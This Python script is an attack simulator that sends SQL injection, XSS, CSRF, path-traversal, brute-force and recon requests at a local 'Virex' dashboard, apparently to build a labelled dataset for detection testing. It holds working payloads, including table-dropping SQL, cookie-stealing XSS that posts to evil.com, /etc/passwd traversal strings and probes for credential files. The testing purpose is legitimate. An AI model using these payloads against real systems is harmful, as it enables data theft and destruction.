"""
VIREX Attack Simulator - Real Project Vulnerabilities Edition
==============================================================
Tests REAL vulnerabilities in the Virex Security Dashboard:
- SQL Injection in /api/users, /api/orders, /api/products
- XSS in comment/message fields
- CSRF attacks (missing token validation)
- Path Traversal in file download endpoints
- Brute Force on /api/auth/login
- Scanner detection (sensitive paths)

Targets ACTUAL endpoints in the project!
"""

import os
import csv
import json
import time
import uuid
import random
import datetime

import requests

# ─────────────────────────── REAL ATTACK PAYLOADS ───────────────────────────

REAL_ATTACK_PAYLOADS = {
    "sqli": {
        "description": "SQL Injection targeting /api/users, /api/orders, /api/products",
        "payloads": [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "1' OR '1'='1' /*",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT username,password,email FROM users--",
            "' UNION SELECT @@version,NULL,NULL--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND SLEEP(5)--",
            "' AND 1=1--",
            "' AND 1=2--",
            "'; DROP TABLE users--",
            "'; DELETE FROM products WHERE 1=1--",
        ],
        "targets": [
            ("GET", "/api/users", "search"),
            ("GET", "/api/orders", "user"),
            ("GET", "/api/products", "search"),
            ("GET", "/api/products", "category"),
            ("POST", "/api/login", "username"),
        ]
    },
    
    "xss": {
        "description": "XSS targeting comment/message/name fields",
        "payloads": [
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<div onmouseover=alert(1)>hover</div>",
            "<a href='javascript:alert(1)'>click</a>",
            "<iframe src='javascript:alert(1)'>",
            "<script>fetch('http://evil.com/?c='+document.cookie)</script>",
            "<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
        ],
        "targets": [
            ("POST", "/api/data", "comment"),
            ("POST", "/api/data", "message"),
            ("POST", "/api/data", "name"),
        ]
    },
    
    "csrf": {
        "description": "CSRF attacks (missing token validation)",
        "payloads": [
            {"action": "delete_user", "user_id": 123},
            {"action": "change_password", "new_password": "hacked123"},
            {"action": "transfer_funds", "amount": 5000, "to": "attacker"},
            {"action": "update_email", "email": "attacker@evil.com"},
        ],
        "targets": [
            ("POST", "/api/data", None),
        ]
    },
    
    "path_traversal": {
        "description": "Path Traversal in file/download endpoints",
        "payloads": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
        ],
        "targets": [
            ("GET", "/api/data", "file"),
            ("GET", "/api/data", "path"),
        ]
    },
    
    "scanner": {
        "description": "Scanner/Recon probing sensitive paths",
        "paths": [
            "/.env",
            "/.git/config",
            "/.git/HEAD",
            "/admin",
            "/phpmyadmin",
            "/backup.sql",
            "/db/virex.db",
            "/data/users.json",
            "/api/swagger.json",
            "/.aws/credentials",
            "/server-status",
            "/web.config",
        ]
    }
}


# ─────────────────────────── SIMULATOR CLASS ───────────────────────────────

class RealAttackSimulator:
    """Attack simulator targeting REAL vulnerabilities in Virex project via Nginx Gateway"""

    def __init__(self, target_url=None, dashboard_url=None):
        from dotenv import load_dotenv
        load_dotenv()
        
        self.dashboard_url = dashboard_url or os.getenv("DASHBOARD_URL", "http://localhost:8070")
        # Ensure traffic hits the Nginx reverse proxy by default
        self.api_url = target_url or os.getenv("TARGET_URL", "http://localhost:8060")
        self.session = requests.Session()

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36",
        ]
        self.scanner_agents = [
            "sqlmap/1.8.3#stable",
            "Nmap Scripting Engine",
            "Nikto/2.5.0",
            "nuclei/2.9.1",
        ]

        self.dataset_rows = []
        self.attack_count = 0
        self.blocked_count = 0

    def _random_ip(self):
        return f"{random.randint(11, 223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def _client_context(self, client_type="normal"):
        if client_type == "scanner":
            agent = random.choice(self.scanner_agents)
        else:
            agent = random.choice(self.user_agents)
        return {
            "ip": self._random_ip(),
            "headers": {
                "User-Agent": agent,
                "Accept": "application/json",
                "X-Forwarded-For": self._random_ip(),
                "X-Real-IP": self._random_ip(),
                "X-Request-ID": str(uuid.uuid4()),
            },
        }

    def _request(self, method, url, context, params=None, json_data=None, timeout=5):
        headers = dict(context["headers"])
        headers["X-Forwarded-For"] = context["ip"]
        
        print(f"      [DEBUG] Attempting {method} request to: {url}")
        
        try:
            if method == "GET":
                resp = self.session.get(url, params=params, headers=headers, timeout=timeout)
            elif method == "POST":
                resp = self.session.post(url, json=json_data, headers=headers, timeout=timeout)
            elif method == "PUT":
                resp = self.session.put(url, json=json_data, headers=headers, timeout=timeout)
            elif method == "DELETE":
                resp = self.session.delete(url, headers=headers, timeout=timeout)
            else:
                return None
            
            self.attack_count += 1
            if resp.status_code in [403, 429]:
                self.blocked_count += 1
            
            return resp
        except requests.exceptions.ConnectionError as e:
            print(f"      [ERROR] ConnectionRefused / DNS Error reaching {url}: {e}")
            return None
        except requests.exceptions.Timeout as e:
            print(f"      [ERROR] Request Timed out reaching {url}: {e}")
            return None
        except Exception as e:
            print(f"      [ERROR] Unknown Exception during request to {url}: {e}")
            return None

    def _pause(self, lo=0.1, hi=0.5):
        time.sleep(random.uniform(lo, hi))

    def _log_dataset(self, attack_type, payload, label, status_code, blocked=False):
        self.dataset_rows.append({
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "attack_type": attack_type,
            "payload_snippet": str(payload)[:120],
            "label": label,
            "status_code": status_code if status_code else "N/A",
            "blocked": blocked,
        })


    def sql_injection_attacks(self, num_attacks=15):
        print(f"  [SQLi] Testing {num_attacks} SQL injection attacks...")
        
        payloads = REAL_ATTACK_PAYLOADS["sqli"]["payloads"]
        targets = REAL_ATTACK_PAYLOADS["sqli"]["targets"]
        
        for i in range(num_attacks):
            method, endpoint, param = random.choice(targets)
            payload = random.choice(payloads)
            context = self._client_context("attacker")
            
            url = f"{self.api_url}{endpoint}"
            
            if method == "GET":
                r = self._request("GET", url, context, params={param: payload})
            else:
                r = self._request("POST", url, context, json_data={param: payload, "password": "test"})
            
            code = r.status_code if r else None
            blocked = code in [403, 429] if code else False
            
            print(f"    [{i+1}/{num_attacks}] {method} {endpoint}?{param}={payload[:30]}... -> {code} {'BLOCKED' if blocked else ''}")
            self._log_dataset("sqli", payload, 1, code, blocked)
            self._pause(0.1, 0.4)

    def xss_attacks(self, num_attacks=12):
        print(f"  [XSS] Testing {num_attacks} XSS attacks...")
        
        payloads = REAL_ATTACK_PAYLOADS["xss"]["payloads"]
        targets = REAL_ATTACK_PAYLOADS["xss"]["targets"]
        
        for i in range(num_attacks):
            method, endpoint, field = random.choice(targets)
            payload = random.choice(payloads)
            context = self._client_context("attacker")
            
            url = f"{self.api_url}{endpoint}"
            body = {field: payload, "email": "test@test.com"}
            r = self._request("POST", url, context, json_data=body)
            
            code = r.status_code if r else None
            blocked = code in [403, 429] if code else False
            
            print(f"    [{i+1}/{num_attacks}] POST {endpoint} {field}={payload[:30]}... -> {code} {'BLOCKED' if blocked else ''}")
            self._log_dataset("xss", payload, 1, code, blocked)
            self._pause(0.1, 0.3)

    def csrf_attacks(self, num_attacks=10):
        print(f"  [CSRF] Testing {num_attacks} CSRF attacks...")
        
        payloads = REAL_ATTACK_PAYLOADS["csrf"]["payloads"]
        targets = REAL_ATTACK_PAYLOADS["csrf"]["targets"]
        
        for i in range(num_attacks):
            method, endpoint, _ = random.choice(targets)
            payload = random.choice(payloads)
            context = self._client_context("attacker")
            context["headers"].pop("Referer", None)
            
            url = f"{self.api_url}{endpoint}"
            r = self._request(method, url, context, json_data=payload)
            
            code = r.status_code if r else None
            blocked = code in [403, 429] if code else False
            
            print(f"    [{i+1}/{num_attacks}] {method} {endpoint} (no CSRF token) -> {code} {'BLOCKED' if blocked else ''}")
            self._log_dataset("csrf", json.dumps(payload)[:80], 1, code, blocked)
            self._pause(0.2, 0.5)

    def path_traversal_attacks(self, num_attacks=10):
        print(f"  [PathTraversal] Testing {num_attacks} path traversal attacks...")
        
        payloads = REAL_ATTACK_PAYLOADS["path_traversal"]["payloads"]
        
        for i in range(num_attacks):
            payload = random.choice(payloads)
            context = self._client_context("attacker")
            
            vector = random.choice([
                ("GET", f"{self.api_url}/api/data", {"file": payload}),
                ("GET", f"{self.api_url}{payload}", None),
            ])
            
            method, url, params = vector
            r = self._request(method, url, context, params=params)
            
            code = r.status_code if r else None
            blocked = code in [403, 404, 429] if code else False
            
            print(f"    [{i+1}/{num_attacks}] {method} {payload[:40]}... -> {code} {'BLOCKED' if blocked else ''}")
            self._log_dataset("path_traversal", payload, 1, code, blocked)
            self._pause(0.1, 0.4)

    def brute_force_login(self, num_attempts=25):
        print(f"  [BruteForce] Testing {num_attempts} login attempts...")
        
        usernames = ["admin", "root", "user", "administrator", "test"]
        passwords = ["123456", "password", "admin123", "Admin@123", "letmein"]
        
        context = self._client_context("attacker")
        
        for i in range(num_attempts):
            uname = random.choice(usernames)
            passwd = random.choice(passwords)
            
            r = self._request("POST", f"{self.api_url}/api/login", context,
                            json_data={"username": uname, "password": passwd})
            
            code = r.status_code if r else None
            blocked = code in [403, 429] if code else False
            
            if i % 5 == 0:
                print(f"    [{i+1}/{num_attempts}] {uname}:{passwd} -> {code} {'BLOCKED' if blocked else ''}")
            
            self._log_dataset("brute_force", f"{uname}:{passwd}", 1, code, blocked)
            self._pause(0.05, 0.2)

    def scanner_simulation(self, num_scans=15):
        print(f"  [Scanner] Testing {num_scans} reconnaissance probes...")
        
        paths = REAL_ATTACK_PAYLOADS["scanner"]["paths"]
        context = self._client_context("scanner")
        
        for i in range(num_scans):
            path = random.choice(paths)
            base = random.choice([self.dashboard_url, self.api_url])
            r = self._request("GET", f"{base}{path}", context)
            
            code = r.status_code if r else None
            blocked = code in [403, 404, 429] if code else False
            
            print(f"    [{i+1}/{num_scans}] {path} -> {code} {'BLOCKED' if blocked else ''}")
            self._log_dataset("recon", path, 1, code, blocked)
            self._pause(0.05, 0.2)

    def legitimate_traffic(self, num_requests=20):
        print(f"  [Legit] Generating {num_requests} normal requests...")
        
        for i in range(num_requests):
            context = self._client_context("normal")
            
            op = random.choice([
                ("GET", f"{self.api_url}/api/health", None),
                ("GET", f"{self.api_url}/api/products", {"category": "electronics"}),
                ("GET", f"{self.api_url}/api/users", {"search": "ahmed"}),
                ("POST", f"{self.api_url}/api/data", {"name": "Ahmed", "email": "ahmed@example.com"}),
            ])
            
            method, url, data = op
            r = self._request(method, url, context, params=data if method == "GET" else None, json_data=data if method == "POST" else None)
            
            code = r.status_code if r else None
            
            if i % 5 == 0:
                print(f"    [{i+1}/{num_requests}] {method} -> {code}")
            
            self._log_dataset("benign", "normal_request", 0, code, False)
            self._pause(0.2, 0.8)

    def export_dataset(self, path="data/real_attack_dataset.csv"):
        os.makedirs(os.path.dirname(path) if os.path.dirname(path) else ".", exist_ok=True)
        fields = ["timestamp", "attack_type", "payload_snippet", "label", "status_code", "blocked"]
        with open(path, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fields)
            writer.writeheader()
            writer.writerows(self.dataset_rows)
        print(f"\n[OK] Dataset exported -> {path}  ({len(self.dataset_rows)} rows)")

    def print_stats(self):
        print(f"\n{'='*65}")
        print(f"  Attack Statistics")
        print(f"{'='*65}")
        print(f"  Total Attacks:  {self.attack_count}")
        print(f"  Blocked:        {self.blocked_count}")
        print(f"  Block Rate:     {(self.blocked_count/self.attack_count*100) if self.attack_count > 0 else 0:.1f}%")
        print(f"  Dataset Rows:   {len(self.dataset_rows)}")
        print(f"{'='*65}\n")

    def run_full_test(self):
        print(f"\n{'='*65}")
        print(f"  VIREX Real Vulnerability Attack Simulator")
        print(f"{'='*65}\n")

        try:
            resp = self.session.get(f"{self.api_url}/api/health", timeout=3)
            print(f"[OK] Target API Gateway reachable at {self.api_url} (status {resp.status_code})")
        except Exception:
            print(f"[WARNING] Cannot reach Target API Gateway at {self.api_url}")

        try:
            resp = self.session.get(f"{self.dashboard_url}/api/health", timeout=3)
            print(f"[OK] Dashboard reachable at {self.dashboard_url} (status {resp.status_code})\n")
        except Exception:
            print(f"[WARNING] Cannot reach Dashboard at {self.dashboard_url}\n")

        print(f"\nStarting Attack Simulation...\n")
        
        self.sql_injection_attacks(15)
        self.legitimate_traffic(10)
        
        self.xss_attacks(12)
        self.legitimate_traffic(8)
        
        self.csrf_attacks(10)
        self.legitimate_traffic(6)
        
        self.path_traversal_attacks(10)
        self.legitimate_traffic(8)
        
        self.brute_force_login(25)
        self.legitimate_traffic(10)
        
        self.scanner_simulation(15)
        self.legitimate_traffic(10)
        
        self.export_dataset()
        self.print_stats()


if __name__ == "__main__":
    import argparse
    from dotenv import load_dotenv
    load_dotenv()

    parser = argparse.ArgumentParser(description="VIREX Real Vulnerability Attack Simulator")
    parser.add_argument("--dashboard", default=os.getenv("DASHBOARD_URL", "http://localhost:8070"), help="Dashboard URL")
    parser.add_argument("--target", default=os.getenv("TARGET_URL", "http://localhost:8060"), help="Target API Gateway URL (Nginx)")
    parser.add_argument("--export", default="data/real_attack_dataset.csv", help="Export path")
    args = parser.parse_args()

    sim = RealAttackSimulator(target_url=args.target, dashboard_url=args.dashboard)
    sim.run_full_test()

